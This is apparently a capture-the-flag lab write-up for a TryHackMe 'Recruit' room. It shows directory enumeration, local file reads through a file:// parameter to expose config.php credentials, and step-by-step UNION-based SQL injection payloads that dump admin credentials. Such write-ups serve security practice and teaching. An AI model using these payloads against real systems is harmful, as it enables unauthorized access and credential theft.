@@ -1,0 +1,169 @@
+Challenge name : Recruit 
+
+This write up walks you through the process of how I exploited the vulnerabilities in the recruit portal
+
+_
+First we accessed the web page on the given ip address
+There was a login form , and we dont know what to input here yet and there's no register account option as tihis portal is private and not public
+
+Then I ran I tried to enumerate the directories in the current portal
+CMD
+gobuster dir -u http://10.48.155.127/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+OUTPUT
+/mail                 (Status: 301) [Size: 313] [--> http://10.48.155.127/mail/]
+/assets               (Status: 301) [Size: 315] [--> http://10.48.155.127/assets/]
+/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.48.155.127/phpmyadmin/]
+/server-status        (Status: 403) [Size: 278]
+
+
+Found out about the mail dir ,which was the only one accessible endpoint among the 4 returned by gobuster
+in the mail endpoint there was a mail.log file which was accessible and in it there was a mail log as expected
+Upon reading it i got to know about the username of a user which was 'hr'
+
+OUTPUT OF MAIL
+As discussed during deployment:
+- HR login credentials (username: hr) are currently stored in the application
+  configuration file (config.php) for ease of access during
+
+this tells us that there's a user called hr and the password or other creds for this user is stored in the config.php file locally 
+
+Now we gotta find our way to the config.php file for the password
+
+
+Back to the original ip, there was a api documentation page also and it had one url under the How can i fetch a candidate CV using the API?
+
+which was 
+URL
+/file.php?cv=<URL>
+
+this was potential directory traversal technique and could be used to find out the password of the hr username 
+
+After that I tried to connect back to my small python server created tin the terminal using the 
+CMD
+python3 -m http.server
+
+i used the cv fetching url and injected my url
+
+URL
+http://10.48.155.127:8000/file.php?cv=http://10.48.91.85/
+
+but it returned
+Only local files are allowed
+
+i tried accesing the /etc/passwd or config.php but it was giving out the same output so i thought of using the file:/// before whatever i wanna accesss
+
+upon trying this 
+URL
+http://10.48.155.127/file.php?cv=file:///etc/passwd
+
+We got the output of 
+Access denied 
+which tells us that the file command actually does work 
+
+so now lets try config.php
+but it said the same output as before 
+
+Now lets try the /var/www/html dir as everything related to hosted websites is stored here usually
+
+URL
+http://10.48.155.127/file.php?cv=file:///var/www/html/config.php
+
+Here we were successful to access the config.php file and the hr credentials were displayed in this file
+tthe password was 
+$HR_PASSWORD = 'hrpassword123';
+
+There we go lets login using these creds
+and then we got our user flag
+THM{LOGGED_IN_USER}
+
+NOw lets try to escalate our privileges 
+
+Lets see if there's a index.php using the same method as above
+
+URL
+http://10.48.155.127/file.php?cv=file:///var/www/html/index.php
+
+And yes we can see the index.php file and it lists a lot of important information
+
+if ($username === 'admin') {
+
+                        $stmt = mysqli_prepare(
+                            $conn,
+                            "SELECT password FROM users WHERE username = ?"
+                        );
+
+This tells that there's a user called admin and their password is saved under the users table in the password column 
+we can use this in sql query with union to look for the password directly
+
+that's a huge step forward but we would like to do that manually to practice the sql injection methodology
+
+Lets go back to our candidate applications page aka the hr user logged in page
+
+There there's a search box saying search candidate name
+Lets see if there's a sqli vuln in this search box by simple searching for '
+
+as expected the response gave us a 
+SQL Error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 
+at the frontend 
+indicating that there's a sql i vuln in this search box
+
+we searched for alice' OR 1=1 -- -
+and it returned everything from the table according to the search query
+
+I tried to enumerate the no of columns in the table by 
+alice' ORDER BY 1 -- -
+i did this till 5 and 5 returned a sql error 
+Unknown column '5' in 'order clause'
+
+which means there is only 4 columns 
+
+now i tried searching 
+
+QUERY
+alice' UNION SELECT 1,2,3,4 -- -
+
+which returned all columns neatly
+
+now i replaced the 4 with database()
+which gave me the database name
+
+QUERY
+alice' UNION SELECT 1,2,3,database() -- -
+
+OUTPUT
+ID 	Name 	Position 	Status
+1 	2 	3 	recruit_db
+
+now we used to check what are the table names in the database by 
+QUERY
+alice' UNION SELECT group_concat(table_name) ,2,3,4 FROM information_schema.tables WHERE table_schema=database() -- -
+
+OUTPUT
+ID 	Name 	Position 	Status
+candidates,users 	2 	3 	4
+
+we are more interested in the users table so lets continue with this table itself
+
+we tried to see the column names in the users table
+
+QUERY
+alice' UNION SELECT group_concat(column_name) ,2,3,4 FROM information_schema.columns WHERE table_name='users' -- -
+
+OUTPUT
+ID 	Name 	Position 	Status
+USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY,id,username,password 	2 	3 	4
+
+This reveals that there are two important columns called username and password 
+we will enumerate these now
+
+QUERY
+alice' UNION SELECT group_concat(username, ':' ,password) ,2,3,4 FROM users -- -
+OUTPUT
+admin:admin@001admin
+
+There we go there's our password appended with the username
+
+and there's our flag
+THM{LOGGED_IN_ADM1N1}
